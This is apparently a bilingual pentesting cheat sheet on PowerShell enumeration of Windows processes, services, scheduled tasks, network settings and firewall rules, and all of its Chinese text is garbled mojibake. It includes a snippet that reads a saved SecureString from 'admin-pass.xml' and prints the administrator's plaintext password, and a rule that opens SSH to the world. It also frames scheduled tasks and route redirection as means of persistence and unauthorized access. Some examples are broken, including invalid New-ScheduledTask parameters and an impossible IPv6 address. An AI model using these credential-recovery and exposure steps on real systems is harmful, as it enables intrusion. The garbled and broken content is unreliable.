Processes are running instances of programs on a computer. They can be thought of as the execution of a program in memory. Each process has its own memory space and resources, and they can communicate with each other through inter-process communication mechanisms.

è¿›ç¨‹æ˜¯è®¡ç®—æœºä¸Šè¿è¡Œçš„ç¨‹åºå®ä¾‹ã€‚å¯ä»¥å°†å…¶è§†ä¸ºåœ¨å†…å­˜ä¸­æ‰§è¡Œçš„ç¨‹åºã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„å†…å­˜ç©ºé—´å’Œèµ„æºï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥é€šè¿‡è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶è¿›è¡Œé€šä¿¡ã€‚

Processes can be started and stopped, and they can also be monitored and controlled. In a Windows environment, PowerShell provides a powerful set of commands for managing processes.

è¿›ç¨‹å¯ä»¥å¯åŠ¨å’Œåœæ­¢ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œç›‘è§†å’Œæ§åˆ¶ã€‚åœ¨Windowsç¯å¢ƒä¸­ï¼ŒPowerShellæä¾›äº†ä¸€å¥—å¼ºå¤§çš„å‘½ä»¤æ¥ç®¡ç†è¿›ç¨‹ã€‚

### Listing Processes

To list all the running processes on a Windows system, you can use the `Get-Process` command. This command will display information such as the process ID, name, CPU usage, and memory usage.

è¦åˆ—å‡ºWindowsç³»ç»Ÿä¸Šæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨`Get-Process`å‘½ä»¤ã€‚è¯¥å‘½ä»¤å°†æ˜¾ç¤ºè¿›ç¨‹IDã€åç§°ã€CPUä½¿ç”¨ç‡å’Œå†…å­˜ä½¿ç”¨ç‡ç­‰ä¿¡æ¯ã€‚

```powershell
Get-Process
```

### Starting Processes

To start a new process using PowerShell, you can use the `Start-Process` command. This command allows you to specify the path to the executable file and any command-line arguments.

è¦ä½¿ç”¨PowerShellå¯åŠ¨æ–°è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨`Start-Process`å‘½ä»¤ã€‚è¯¥å‘½ä»¤å…è®¸æ‚¨æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„å’Œä»»ä½•å‘½ä»¤è¡Œå‚æ•°ã€‚

```powershell
Start-Process -FilePath "C:\path\to\executable.exe" -ArgumentList "-arg1 value1 -arg2 value2"
```

### Stopping Processes

To stop a running process, you can use the `Stop-Process` command. This command requires the process ID or name as a parameter.

è¦åœæ­¢è¿è¡Œä¸­çš„è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨`Stop-Process`å‘½ä»¤ã€‚è¯¥å‘½ä»¤éœ€è¦è¿›ç¨‹IDæˆ–åç§°ä½œä¸ºå‚æ•°ã€‚

```powershell
Stop-Process -Id 1234
```

### Monitoring Processes

PowerShell provides several commands for monitoring processes. For example, you can use the `Get-Process` command with the `-Name` parameter to get information about a specific process.

PowerShellæä¾›äº†å‡ ä¸ªç”¨äºç›‘è§†è¿›ç¨‹çš„å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨`Get-Process`å‘½ä»¤å’Œ`-Name`å‚æ•°æ¥è·å–æœ‰å…³ç‰¹å®šè¿›ç¨‹çš„ä¿¡æ¯ã€‚

```powershell
Get-Process -Name "processname"
```

You can also use the `Get-WmiObject` command to query process information using Windows Management Instrumentation (WMI).

è¿˜å¯ä»¥ä½¿ç”¨`Get-WmiObject`å‘½ä»¤ä½¿ç”¨Windowsç®¡ç†è§„èŒƒï¼ˆWMIï¼‰æŸ¥è¯¢è¿›ç¨‹ä¿¡æ¯ã€‚

```powershell
Get-WmiObject -Class Win32_Process
```

### Controlling Processes

PowerShell allows you to control processes by sending signals to them. For example, you can use the `Stop-Process` command with the `-Force` parameter to forcefully terminate a process.

PowerShellå…è®¸æ‚¨é€šè¿‡å‘è¿›ç¨‹å‘é€ä¿¡å·æ¥æ§åˆ¶å®ƒä»¬ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨`Stop-Process`å‘½ä»¤å’Œ`-Force`å‚æ•°æ¥å¼ºåˆ¶ç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹ã€‚

```powershell
Stop-Process -Id 1234 -Force
```

You can also use the `Start-Sleep` command to pause the execution of a script or command for a specified amount of time.

è¿˜å¯ä»¥ä½¿ç”¨`Start-Sleep`å‘½ä»¤æš‚åœè„šæœ¬æˆ–å‘½ä»¤çš„æ‰§è¡Œä¸€æ®µæŒ‡å®šçš„æ—¶é—´ã€‚

```powershell
Start-Sleep -Seconds 5
```

### Conclusion

Understanding how to manage and control processes is an important skill for a pentester. PowerShell provides a wide range of commands for listing, starting, stopping, monitoring, and controlling processes on a Windows system. By mastering these commands, you can effectively navigate and manipulate the processes running on a target system.
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## æœåŠ¡

### Introduction

### ä»‹ç»

In this section, we will cover some basic PowerShell commands that can be useful for pentesters when performing reconnaissance and enumeration on Windows systems. PowerShell is a powerful scripting language and automation framework that is built into Windows. It provides a command-line interface for interacting with the Windows operating system and can be used to perform a wide range of tasks, including system administration, network analysis, and security testing.

åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä¸€äº›åŸºæœ¬çš„PowerShellå‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å¯¹äºæ¸—é€æµ‹è¯•äººå‘˜åœ¨å¯¹Windowsç³»ç»Ÿè¿›è¡Œä¾¦å¯Ÿå’Œæšä¸¾æ—¶éå¸¸æœ‰ç”¨ã€‚PowerShellæ˜¯ä¸€ç§å¼ºå¤§çš„è„šæœ¬è¯­è¨€å’Œè‡ªåŠ¨åŒ–æ¡†æ¶ï¼Œå®ƒå†…ç½®äºWindowsä¸­ã€‚å®ƒæä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œç•Œé¢ï¼Œç”¨äºä¸Windowsæ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œå¹¶å¯ç”¨äºæ‰§è¡Œå„ç§ä»»åŠ¡ï¼ŒåŒ…æ‹¬ç³»ç»Ÿç®¡ç†ã€ç½‘ç»œåˆ†æå’Œå®‰å…¨æµ‹è¯•ã€‚

### Basic PowerShell Commands

### åŸºæœ¬çš„PowerShellå‘½ä»¤

#### Get-Service

#### Get-Service

The `Get-Service` command is used to retrieve information about services running on a Windows system. It can be used to list all services or filter the results based on specific criteria such as service name or status.

`Get-Service`å‘½ä»¤ç”¨äºæ£€ç´¢è¿è¡Œåœ¨Windowsç³»ç»Ÿä¸Šçš„æœåŠ¡çš„ä¿¡æ¯ã€‚å®ƒå¯ä»¥ç”¨äºåˆ—å‡ºæ‰€æœ‰æœåŠ¡ï¼Œæˆ–æ ¹æ®ç‰¹å®šçš„æ¡ä»¶ï¼ˆå¦‚æœåŠ¡åç§°æˆ–çŠ¶æ€ï¼‰ç­›é€‰ç»“æœã€‚

To list all services, simply run the following command:

è¦åˆ—å‡ºæ‰€æœ‰æœåŠ¡ï¼Œåªéœ€è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Get-Service
```

This will display a list of all services along with their status, display name, and service name.

è¿™å°†æ˜¾ç¤ºæ‰€æœ‰æœåŠ¡çš„åˆ—è¡¨ï¼Œä»¥åŠå®ƒä»¬çš„çŠ¶æ€ã€æ˜¾ç¤ºåç§°å’ŒæœåŠ¡åç§°ã€‚

To filter the results based on a specific service name, use the `-Name` parameter followed by the service name. For example, to retrieve information about the "Spooler" service, run the following command:

è¦æ ¹æ®ç‰¹å®šçš„æœåŠ¡åç§°ç­›é€‰ç»“æœï¼Œè¯·ä½¿ç”¨`-Name`å‚æ•°ï¼Œåè·ŸæœåŠ¡åç§°ã€‚ä¾‹å¦‚ï¼Œè¦æ£€ç´¢æœ‰å…³â€œSpoolerâ€æœåŠ¡çš„ä¿¡æ¯ï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Get-Service -Name Spooler
```

This will display information about the "Spooler" service only.

è¿™å°†ä»…æ˜¾ç¤ºæœ‰å…³â€œSpoolerâ€æœåŠ¡çš„ä¿¡æ¯ã€‚

To filter the results based on a specific service status, use the `-Status` parameter followed by the desired status. For example, to list all running services, run the following command:

è¦æ ¹æ®ç‰¹å®šçš„æœåŠ¡çŠ¶æ€ç­›é€‰ç»“æœï¼Œè¯·ä½¿ç”¨`-Status`å‚æ•°ï¼Œåè·Ÿæ‰€éœ€çš„çŠ¶æ€ã€‚ä¾‹å¦‚ï¼Œè¦åˆ—å‡ºæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„æœåŠ¡ï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Get-Service -Status Running
```

This will display a list of all running services.

è¿™å°†æ˜¾ç¤ºæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„æœåŠ¡çš„åˆ—è¡¨ã€‚

#### Start-Service

#### Start-Service

The `Start-Service` command is used to start a stopped service on a Windows system. It requires administrative privileges to run.

`Start-Service`å‘½ä»¤ç”¨äºå¯åŠ¨Windowsç³»ç»Ÿä¸Šçš„å·²åœæ­¢çš„æœåŠ¡ã€‚å®ƒéœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½è¿è¡Œã€‚

To start a service, use the following command:

è¦å¯åŠ¨ä¸€ä¸ªæœåŠ¡ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Start-Service -Name <service_name>
```

Replace `<service_name>` with the name of the service you want to start.

å°†`<service_name>`æ›¿æ¢ä¸ºæ‚¨è¦å¯åŠ¨çš„æœåŠ¡çš„åç§°ã€‚

#### Stop-Service

#### Stop-Service

The `Stop-Service` command is used to stop a running service on a Windows system. It requires administrative privileges to run.

`Stop-Service`å‘½ä»¤ç”¨äºåœæ­¢Windowsç³»ç»Ÿä¸Šæ­£åœ¨è¿è¡Œçš„æœåŠ¡ã€‚å®ƒéœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½è¿è¡Œã€‚

To stop a service, use the following command:

è¦åœæ­¢ä¸€ä¸ªæœåŠ¡ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Stop-Service -Name <service_name>
```

Replace `<service_name>` with the name of the service you want to stop.

å°†`<service_name>`æ›¿æ¢ä¸ºæ‚¨è¦åœæ­¢çš„æœåŠ¡çš„åç§°ã€‚

### Conclusion

### ç»“è®º

PowerShell provides a powerful set of commands for managing services on Windows systems. The `Get-Service`, `Start-Service`, and `Stop-Service` commands can be used to retrieve information about services, start stopped services, and stop running services, respectively. These commands can be useful for pentesters during the reconnaissance and enumeration phases of a penetration test.

PowerShellæä¾›äº†ä¸€å¥—å¼ºå¤§çš„å‘½ä»¤ï¼Œç”¨äºç®¡ç†Windowsç³»ç»Ÿä¸Šçš„æœåŠ¡ã€‚`Get-Service`ã€`Start-Service`å’Œ`Stop-Service`å‘½ä»¤åˆ†åˆ«ç”¨äºæ£€ç´¢æœ‰å…³æœåŠ¡çš„ä¿¡æ¯ã€å¯åŠ¨å·²åœæ­¢çš„æœåŠ¡å’Œåœæ­¢æ­£åœ¨è¿è¡Œçš„æœåŠ¡ã€‚è¿™äº›å‘½ä»¤åœ¨æ¸—é€æµ‹è¯•çš„ä¾¦å¯Ÿå’Œæšä¸¾é˜¶æ®µå¯¹æ¸—é€æµ‹è¯•äººå‘˜éå¸¸æœ‰ç”¨ã€‚
```
Get-Service
```
## ä»å®‰å…¨å­—ç¬¦ä¸²ä¸­è·å–å¯†ç 

åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å¤„ç†å¯†ç ã€‚åœ¨Windowsç¯å¢ƒä¸­ï¼Œå¯†ç é€šå¸¸ä»¥å®‰å…¨å­—ç¬¦ä¸²çš„å½¢å¼å­˜å‚¨ï¼Œè¿™æ˜¯ä¸€ç§åŠ å¯†çš„æ–¹å¼ï¼Œå¯ä»¥ä¿æŠ¤å¯†ç çš„æœºå¯†æ€§ã€‚ç„¶è€Œï¼Œå¯¹äºæ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯è¯»çš„å¯†ç ï¼Œä»¥ä¾¿åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ä½¿ç”¨ã€‚

PowerShellæä¾›äº†ä¸€ç§ä»å®‰å…¨å­—ç¬¦ä¸²ä¸­è·å–å¯†ç çš„æ–¹æ³•ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹è„šæœ¬ï¼Œæ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨PowerShellä»å®‰å…¨å­—ç¬¦ä¸²ä¸­æå–å¯†ç ï¼š

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$plainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
Write-Output $plainTextPassword
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨`ConvertTo-SecureString`å‘½ä»¤å°†æ˜æ–‡å¯†ç è½¬æ¢ä¸ºå®‰å…¨å­—ç¬¦ä¸²ã€‚ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨`[Runtime.InteropServices.Marshal]::SecureStringToBSTR`æ–¹æ³•å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºBSTRï¼ˆåŸºäºCOMçš„å­—ç¬¦ä¸²ï¼‰è¡¨ç¤ºã€‚æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨`[Runtime.InteropServices.Marshal]::PtrToStringAuto`æ–¹æ³•å°†BSTRè½¬æ¢ä¸ºå¯è¯»çš„å¯†ç ã€‚

è¯·æ³¨æ„ï¼Œè¿™ç§æ–¹æ³•åªé€‚ç”¨äºå½“å‰ä¼šè¯ä¸­çš„å¯†ç ã€‚å¦‚æœå¯†ç æ˜¯åœ¨å…¶ä»–ä¼šè¯ä¸­åˆ›å»ºçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†æ— æ³•æå–å¯†ç ã€‚

è¿™æ˜¯ä¸€ä¸ªç®€å•è€Œæœ‰æ•ˆçš„æ–¹æ³•ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜åœ¨Windowsç¯å¢ƒä¸­å¤„ç†å®‰å…¨å­—ç¬¦ä¸²å¹¶è·å–å¯†ç ã€‚
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## è®¡åˆ’ä»»åŠ¡

Scheduled tasks are a powerful feature in Windows that allow you to automate the execution of scripts or programs at specific times or intervals. As a pentester, understanding how to leverage scheduled tasks can be beneficial for persistence, privilege escalation, and lateral movement.

è®¡åˆ’ä»»åŠ¡æ˜¯Windowsä¸­çš„ä¸€ä¸ªå¼ºå¤§åŠŸèƒ½ï¼Œå®ƒå…è®¸æ‚¨åœ¨ç‰¹å®šæ—¶é—´æˆ–é—´éš”å†…è‡ªåŠ¨æ‰§è¡Œè„šæœ¬æˆ–ç¨‹åºã€‚ä½œä¸ºä¸€åæ¸—é€æµ‹è¯•äººå‘˜ï¼Œäº†è§£å¦‚ä½•åˆ©ç”¨è®¡åˆ’ä»»åŠ¡å¯ä»¥å¯¹æŒä¹…æ€§ã€æƒé™æå‡å’Œæ¨ªå‘ç§»åŠ¨äº§ç”Ÿç§¯æå½±å“ã€‚

### Viewing Scheduled Tasks

### æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡

To view the existing scheduled tasks on a Windows system, you can use the `Get-ScheduledTask` cmdlet in PowerShell. This cmdlet retrieves a list of all scheduled tasks along with their properties.

è¦æŸ¥çœ‹Windowsç³»ç»Ÿä¸Šç°æœ‰çš„è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`Get-ScheduledTask`å‘½ä»¤ã€‚è¯¥å‘½ä»¤æ£€ç´¢æ‰€æœ‰è®¡åˆ’ä»»åŠ¡åŠå…¶å±æ€§çš„åˆ—è¡¨ã€‚

```powershell
Get-ScheduledTask
```

### Creating Scheduled Tasks

### åˆ›å»ºè®¡åˆ’ä»»åŠ¡

To create a new scheduled task, you can use the `New-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to specify the script or program to be executed, the trigger that defines when the task should run, and other settings such as the user account under which the task should run.

è¦åˆ›å»ºä¸€ä¸ªæ–°çš„è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`New-ScheduledTask`å‘½ä»¤ã€‚è¯¥å‘½ä»¤å…è®¸æ‚¨æŒ‡å®šè¦æ‰§è¡Œçš„è„šæœ¬æˆ–ç¨‹åºã€å®šä¹‰ä»»åŠ¡ä½•æ—¶è¿è¡Œçš„è§¦å‘å™¨ä»¥åŠå…¶ä»–è®¾ç½®ï¼Œå¦‚ä»»åŠ¡åº”åœ¨å“ªä¸ªç”¨æˆ·å¸æˆ·ä¸‹è¿è¡Œã€‚

```powershell
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\script.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am) -User "DOMAIN\username" -Password "password"
```

### Modifying Scheduled Tasks

### ä¿®æ”¹è®¡åˆ’ä»»åŠ¡

To modify an existing scheduled task, you can use the `Set-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to change various properties of the task, such as the script or program to be executed, the trigger, and the user account.

è¦ä¿®æ”¹ç°æœ‰çš„è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`Set-ScheduledTask`å‘½ä»¤ã€‚è¯¥å‘½ä»¤å…è®¸æ‚¨æ›´æ”¹ä»»åŠ¡çš„å„ç§å±æ€§ï¼Œå¦‚è¦æ‰§è¡Œçš„è„šæœ¬æˆ–ç¨‹åºã€è§¦å‘å™¨å’Œç”¨æˆ·å¸æˆ·ã€‚

```powershell
Set-ScheduledTask -TaskPath "\Folder" -TaskName "TaskName" -Action (New-ScheduledTaskAction -Execute "C:\path\to\newscript.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 4am) -User "DOMAIN\username" -Password "password"
```

### Deleting Scheduled Tasks

### åˆ é™¤è®¡åˆ’ä»»åŠ¡

To delete a scheduled task, you can use the `Unregister-ScheduledTask` cmdlet in PowerShell. This cmdlet removes the specified task from the system.

è¦åˆ é™¤è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`Unregister-ScheduledTask`å‘½ä»¤ã€‚è¯¥å‘½ä»¤ä»ç³»ç»Ÿä¸­åˆ é™¤æŒ‡å®šçš„ä»»åŠ¡ã€‚

```powershell
Unregister-ScheduledTask -TaskPath "\Folder" -TaskName "TaskName"
```

### Conclusion

### ç»“è®º

Scheduled tasks are a useful feature in Windows that can be leveraged by pentesters for various purposes. By understanding how to view, create, modify, and delete scheduled tasks using PowerShell, you can effectively utilize this feature during your engagements.
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
## ç½‘ç»œ

### æ¥å£

#### PowerShellå‘½ä»¤

```powershell
Get-NetAdapter
```

æ­¤å‘½ä»¤ç”¨äºè·å–ç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç½‘ç»œé€‚é…å™¨çš„è¯¦ç»†ä¿¡æ¯ã€‚

#### ç¤ºä¾‹è¾“å‡º

```
Name                      InterfaceDescription                    ifIndex Status       MacAddress             LinkSpeed
----                      --------------------                    ------- ------       ----------             ---------
Ethernet                  Intel(R) Ethernet Connection (2) I219-V      12 Up           00-11-22-33-44-55       1 Gbps
Wi-Fi                     Intel(R) Dual Band Wireless-AC 8265          13 Up           66-77-88-99-AA-BB       300 Mbps
```

#### è§£é‡Š

- `Name`ï¼šé€‚é…å™¨çš„åç§°ã€‚
- `InterfaceDescription`ï¼šé€‚é…å™¨çš„æè¿°ã€‚
- `ifIndex`ï¼šé€‚é…å™¨çš„ç´¢å¼•å·ã€‚
- `Status`ï¼šé€‚é…å™¨çš„çŠ¶æ€ã€‚
- `MacAddress`ï¼šé€‚é…å™¨çš„ç‰©ç†åœ°å€ã€‚
- `LinkSpeed`ï¼šé€‚é…å™¨çš„é“¾æ¥é€Ÿåº¦ã€‚

#### PowerShellå‘½ä»¤

```powershell
Get-NetIPAddress
```

æ­¤å‘½ä»¤ç”¨äºè·å–ç³»ç»Ÿä¸Šçš„æ‰€æœ‰IPåœ°å€çš„è¯¦ç»†ä¿¡æ¯ã€‚

#### ç¤ºä¾‹è¾“å‡º

```
IPAddress         : 192.168.0.100
InterfaceIndex    : 12
InterfaceAlias    : Ethernet
AddressFamily     : IPv4
Type              : Unicast
PrefixLength      : 24
PrefixOrigin      : Manual
SuffixOrigin      : Manual
AddressState      : Preferred

IPAddress         : fe80::1234:5678:abcd:efgh%13
InterfaceIndex    : 13
InterfaceAlias    : Wi-Fi
AddressFamily     : IPv6
Type              : Unicast
PrefixLength      : 64
PrefixOrigin      : WellKnown
SuffixOrigin      : Link
AddressState      : Preferred
```

#### è§£é‡Š

- `IPAddress`ï¼šIPåœ°å€ã€‚
- `InterfaceIndex`ï¼šé€‚é…å™¨çš„ç´¢å¼•å·ã€‚
- `InterfaceAlias`ï¼šé€‚é…å™¨çš„åˆ«åã€‚
- `AddressFamily`ï¼šåœ°å€ç±»å‹ï¼ˆIPv4æˆ–IPv6ï¼‰ã€‚
- `Type`ï¼šåœ°å€ç±»å‹ï¼ˆå•æ’­ã€å¹¿æ’­ç­‰ï¼‰ã€‚
- `PrefixLength`ï¼šå‰ç¼€é•¿åº¦ã€‚
- `PrefixOrigin`ï¼šå‰ç¼€æ¥æºã€‚
- `SuffixOrigin`ï¼šåç¼€æ¥æºã€‚
- `AddressState`ï¼šåœ°å€çŠ¶æ€ã€‚

#### PowerShellå‘½ä»¤

```powershell
Get-NetRoute
```

æ­¤å‘½ä»¤ç”¨äºè·å–ç³»ç»Ÿä¸Šçš„æ‰€æœ‰è·¯ç”±è¡¨é¡¹çš„è¯¦ç»†ä¿¡æ¯ã€‚

#### ç¤ºä¾‹è¾“å‡º

```
DestinationPrefix          NextHop         RouteMetric ifIndex
-----------------          -------         ----------- -------
0.0.0.0/0                  192.168.0.1     25          12
192.168.0.0/24             0.0.0.0         25          12
```

#### è§£é‡Š

- `DestinationPrefix`ï¼šç›®æ ‡å‰ç¼€ã€‚
- `NextHop`ï¼šä¸‹ä¸€è·³åœ°å€ã€‚
- `RouteMetric`ï¼šè·¯ç”±åº¦é‡å€¼ã€‚
- `ifIndex`ï¼šé€‚é…å™¨çš„ç´¢å¼•å·ã€‚
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### é˜²ç«å¢™

A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware appliances or as software running on a computer.

é˜²ç«å¢™æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨è®¾å¤‡ï¼Œæ ¹æ®é¢„å…ˆç¡®å®šçš„å®‰å…¨è§„åˆ™ç›‘æ§å’Œæ§åˆ¶è¿›å‡ºç½‘ç»œçš„æµé‡ã€‚å®ƒä½œä¸ºä¸€ä¸ªå±éšœå­˜åœ¨äºå¯ä¿¡ä»»çš„å†…éƒ¨ç½‘ç»œå’Œä¸å¯ä¿¡ä»»çš„å¤–éƒ¨ç½‘ç»œï¼ˆå¦‚äº’è”ç½‘ï¼‰ä¹‹é—´ã€‚é˜²ç«å¢™å¯ä»¥ä½œä¸ºç¡¬ä»¶è®¾å¤‡æˆ–ä½œä¸ºè¿è¡Œåœ¨è®¡ç®—æœºä¸Šçš„è½¯ä»¶æ¥å®ç°ã€‚

Firewalls use various techniques to filter network traffic, such as packet filtering, stateful inspection, and application-level gateways. They can block or allow traffic based on factors such as source and destination IP addresses, port numbers, and protocols.

é˜²ç«å¢™ä½¿ç”¨å„ç§æŠ€æœ¯æ¥è¿‡æ»¤ç½‘ç»œæµé‡ï¼Œå¦‚æ•°æ®åŒ…è¿‡æ»¤ã€çŠ¶æ€æ£€æŸ¥å’Œåº”ç”¨å±‚ç½‘å…³ã€‚å®ƒä»¬å¯ä»¥æ ¹æ®æºå’Œç›®æ ‡IPåœ°å€ã€ç«¯å£å·å’Œåè®®ç­‰å› ç´ æ¥é˜»æ­¢æˆ–å…è®¸æµé‡é€šè¿‡ã€‚

Firewalls are an essential component of network security and are commonly used to protect against unauthorized access, malware, and other cyber threats. They can also be configured to log network activity, providing valuable information for monitoring and incident response.

é˜²ç«å¢™æ˜¯ç½‘ç»œå®‰å…¨çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œé€šå¸¸ç”¨äºé˜²æ­¢æœªç»æˆæƒçš„è®¿é—®ã€æ¶æ„è½¯ä»¶å’Œå…¶ä»–ç½‘ç»œå¨èƒã€‚å®ƒä»¬è¿˜å¯ä»¥é…ç½®ä¸ºè®°å½•ç½‘ç»œæ´»åŠ¨ï¼Œä¸ºç›‘æ§å’Œäº‹ä»¶å“åº”æä¾›æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### è·¯ç”±

A route is a path that network traffic takes from one network to another. In the context of penetration testing, understanding and manipulating routes can be crucial for gaining access to target systems.

è·¯ç”±æ˜¯ç½‘ç»œæµé‡ä»ä¸€ä¸ªç½‘ç»œåˆ°å¦ä¸€ä¸ªç½‘ç»œçš„è·¯å¾„ã€‚åœ¨æ¸—é€æµ‹è¯•çš„èƒŒæ™¯ä¸‹ï¼Œç†è§£å’Œæ“çºµè·¯ç”±å¯¹äºè·å–ç›®æ ‡ç³»ç»Ÿçš„è®¿é—®æƒé™è‡³å…³é‡è¦ã€‚

#### Route Enumeration

Route enumeration is the process of identifying and gathering information about the routes that exist on a target system. This information can be used to identify potential paths for further exploitation.

è·¯ç”±æšä¸¾æ˜¯è¯†åˆ«å’Œæ”¶é›†ç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨çš„è·¯ç”±ä¿¡æ¯çš„è¿‡ç¨‹ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥ç”¨äºè¯†åˆ«è¿›ä¸€æ­¥åˆ©ç”¨çš„æ½œåœ¨è·¯å¾„ã€‚

#### Route Manipulation

Route manipulation involves modifying the existing routes on a target system to redirect network traffic to a desired destination. This can be done by adding, modifying, or deleting routes.

è·¯ç”±æ“çºµæ¶‰åŠä¿®æ”¹ç›®æ ‡ç³»ç»Ÿä¸Šç°æœ‰çš„è·¯ç”±ï¼Œå°†ç½‘ç»œæµé‡é‡å®šå‘åˆ°æ‰€éœ€çš„ç›®æ ‡ã€‚å¯ä»¥é€šè¿‡æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤è·¯ç”±æ¥å®ç°ã€‚

#### Route Redirection

Route redirection is a technique used to redirect network traffic from one network to another through a compromised system. This can be useful for bypassing network security measures and gaining unauthorized access to target systems.

è·¯ç”±é‡å®šå‘æ˜¯ä¸€ç§é€šè¿‡å—æŸç³»ç»Ÿå°†ç½‘ç»œæµé‡ä»ä¸€ä¸ªç½‘ç»œé‡å®šå‘åˆ°å¦ä¸€ä¸ªç½‘ç»œçš„æŠ€æœ¯ã€‚è¿™å¯¹äºç»•è¿‡ç½‘ç»œå®‰å…¨æªæ–½å¹¶æœªæˆæƒåœ°è®¿é—®ç›®æ ‡ç³»ç»Ÿéå¸¸æœ‰ç”¨ã€‚

#### Route Poisoning

Route poisoning is a method of manipulating routing tables to misdirect network traffic. By injecting false routing information, an attacker can redirect traffic to a malicious destination or cause network disruptions.

